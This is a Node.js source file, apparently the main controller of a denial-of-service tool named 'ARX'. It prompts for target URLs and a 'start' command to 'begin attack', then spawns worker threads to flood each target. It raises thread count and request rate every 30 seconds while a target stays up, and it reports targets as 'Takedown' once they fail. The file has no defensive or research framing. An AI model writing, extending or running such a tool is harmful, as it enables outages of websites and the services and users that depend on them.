// main.js
const readline = require('readline');
const { Worker } = require('worker_threads');
const os = require('os');
const chalk = require('chalk');
const http = require('http');
const https = require('https');

console.clear();
console.log(chalk.redBright.bold('⚔ ARX - Advanced Request eXecutor ⚔'));
console.log(chalk.gray('By: Akashirohman and team\n'));

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
readline.emitKeypressEvents(process.stdin);
if (process.stdin.isTTY) process.stdin.setRawMode(true);

let targets = [], workers = {}, stats = {}, statuses = {}, configs = {};

function askURL(index = 0) {
  rl.question(`Target URL #${index + 1} (leave blank to finish): `, async url => {
    if (!url.trim()) {
      if (targets.length === 0) return askURL(index);
      return askCommand();
    }
    const isLive = await testTarget(url.trim());
    targets.push(url.trim());
    statuses[url.trim()] = isLive ? 'live' : 'down';
    stats[url.trim()] = { sent: 0, success: 0, failed: 0 };
    configs[url.trim()] = { threads: 1, rps: 10, lastScale: Date.now() };
    askURL(index + 1);
  });
}

function askCommand() {
  rl.question('Type "start" to begin attack: ', (input) => {
    if (input.trim().toLowerCase() === 'start') {
      startAttack();
    } else {
      askCommand();
    }
  });
}

function testTarget(url) {
  return new Promise(resolve => {
    const lib = url.startsWith('https') ? https : http;
    const req = lib.get(url, { timeout: 5000 }, res => {
      res.resume();
      resolve(true);
    });
    req.on('error', () => resolve(false));
    req.on('timeout', () => {
      req.destroy();
      resolve(false);
    });
  });
}

function startAttack() {
  console.clear();
  console.log(chalk.redBright.bold('⚔ ARX - Advanced Request eXecutor ⚔'));
  console.log(chalk.gray('By: Akashirohman and team\n'));

  for (const url of targets) launchWorkers(url);
  displayStats();
  autoScaleMonitor();
  listenCommand();
}

function launchWorkers(url) {
  workers[url] = [];
  for (let j = 0; j < configs[url].threads; j++) {
    const worker = new Worker('./worker.js', {
      workerData: { target: url, rps: configs[url].rps }
    });
    worker.on('message', ({ sent, success, failed }) => {
      stats[url].sent += sent;
      stats[url].success += success;
      stats[url].failed += failed;
    });
    workers[url].push(worker);
  }
}

function scaleUp(url) {
  const config = configs[url];
  const cpuLoad = os.loadavg()[0] / os.cpus().length;
  if (cpuLoad < 0.85 && statuses[url] === 'live' && Date.now() - config.lastScale > 10000) {
    config.threads++;
    config.rps += 10;
    const worker = new Worker('./worker.js', {
      workerData: { target: url, rps: config.rps }
    });
    worker.on('message', ({ sent, success, failed }) => {
      stats[url].sent += sent;
      stats[url].success += success;
      stats[url].failed += failed;
    });
    workers[url].push(worker);
    config.lastScale = Date.now();
  }
}

function autoScaleMonitor() {
  setInterval(() => {
    targets.forEach(async (url) => {
      const alive = await testTarget(url);
      statuses[url] = alive ? 'live' : 'takedown';
      scaleUp(url);
    });
  }, 30000);
}

function displayStats() {
  setInterval(() => {
    readline.cursorTo(process.stdout, 0, 3);
    targets.forEach((url, i) => {
      const s = stats[url];
      const status = statuses[url] === 'live' ? chalk.greenBright('Alive') : chalk.redBright('Takedown');
      readline.clearLine(process.stdout, 0);
      process.stdout.write(`[Target ${i + 1}] ${chalk.cyan(url)} | ${status}\n`);
      process.stdout.write(`Sent    : ${chalk.yellow(s.sent)} | Success : ${chalk.green(s.success)} | Failed : ${chalk.red(s.failed)}\n\n`);
    });
    readline.moveCursor(process.stdout, 0, 1);
    readline.clearLine(process.stdout, 0);
    process.stdout.write('Command (stop): ');
  }, 1000);
}

function listenCommand() {
  rl.on('line', line => {
    if (line.trim().toLowerCase() === 'stop') {
      targets.forEach(url => workers[url].forEach(w => w.terminate()));
      console.log(chalk.redBright('\n[STOPPED] All targets stopped.'));
      process.exit(0);
    }
  });
}

askURL();
